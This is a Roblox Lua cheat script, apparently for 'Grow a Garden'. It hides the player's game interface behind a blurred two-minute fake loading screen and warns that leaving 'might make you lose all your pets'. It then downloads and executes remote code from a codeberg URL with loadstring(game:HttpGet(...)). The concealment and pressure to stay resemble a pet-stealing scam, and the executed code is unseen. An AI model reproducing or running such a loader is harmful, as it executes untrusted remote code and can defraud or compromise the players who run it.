-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer

-- Freeze CoreGuis
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Blur Effect
local Blur = Instance.new("BlurEffect")
Blur.Size = 25
Blur.Parent = Lighting

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true

-- Triangular Background Design (Layered Frames)
for i = 1, 10 do
    local Triangle = Instance.new("Frame")
    Triangle.Size = UDim2.new(1, 0, 0.1, 0)
    Triangle.Position = UDim2.new(0, 0, (i-1)*0.1, 0)
    Triangle.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(30, 30, 30) or Color3.fromRGB(10, 10, 10)
    Triangle.BorderSizePixel = 0
    Triangle.Parent = ScreenGui
end

-- Warning Label
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, 0, 0.1, 0)
WarningLabel.Position = UDim2.new(0, 0, 0.05, 0)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "⚠️ Please don't leave while executing the script, this might make you lose all your pets!"
WarningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextScaled = true
WarningLabel.Parent = ScreenGui

-- Pulsing Animation
task.spawn(function()
    while ScreenGui.Parent do
        for i = 1, 20 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
        for i = 20, 1, -1 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
    end
end)

-- Sonic Spinner
local Spinner = Instance.new("ImageLabel")
Spinner.Size = UDim2.new(0, 150, 0, 150)
Spinner.AnchorPoint = Vector2.new(0.5, 0)
Spinner.Position = UDim2.new(0.5, 0, 0.2, 0)
Spinner.BackgroundTransparency = 1
Spinner.Image = "rbxassetid://14284090563" -- Sonic Spin
Spinner.Parent = ScreenGui

-- Spinner Rotation Animation (Sonic Speed)
task.spawn(function()
    local rotation = 0
    while Spinner.Parent do
        rotation = rotation + 10
        Spinner.Rotation = rotation % 360
        task.wait(0.01)
    end
end)

-- Progress Bar Background
local ProgressBarBG = Instance.new("Frame")
ProgressBarBG.Size = UDim2.new(0.6, 0, 0.02, 0)
ProgressBarBG.AnchorPoint = Vector2.new(0.5, 0)
ProgressBarBG.Position = UDim2.new(0.5, 0, 0.5, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBarBG.BorderSizePixel = 0
ProgressBarBG.Parent = ScreenGui

-- Progress Bar Fill
local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBG

-- Percentage Text
local PercentageLabel = Instance.new("TextLabel")
PercentageLabel.Size = UDim2.new(1, 0, 0.05, 0)
PercentageLabel.Position = UDim2.new(0, 0, 0.55, 0)
PercentageLabel.BackgroundTransparency = 1
PercentageLabel.Text = "Loading... 0%"
PercentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentageLabel.Font = Enum.Font.GothamBold
PercentageLabel.TextSize = 28
PercentageLabel.Parent = ScreenGui

-- Funny Tips Text
local TipLabel = Instance.new("TextLabel")
TipLabel.Size = UDim2.new(1, 0, 0.05, 0)
TipLabel.Position = UDim2.new(0, 0, 0.62, 0)
TipLabel.BackgroundTransparency = 1
TipLabel.Text = "Preparing magic soil..."
TipLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TipLabel.Font = Enum.Font.Gotham
TipLabel.TextSize = 20
TipLabel.Parent = ScreenGui

-- Funny Tips Rotation
local funnyTips = {
    "Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}
task.spawn(function()
    while ScreenGui.Parent do
        TipLabel.Text = funnyTips[math.random(1, #funnyTips)]
        task.wait(4)
    end
end)

-- Loading Progress (2 Minutes)
for i = 1, 100 do
    local progress = i / 100
    PercentageLabel.Text = "Loading... " .. i .. "%"
    ProgressBarFill.Size = UDim2.new(progress, 0, 1, 0)
    task.wait(1.2)
end

-- Cleanup UI and Unfreeze CoreGui
ScreenGui:Destroy()
Blur:Destroy()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

-- Execute Actual Script
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load()
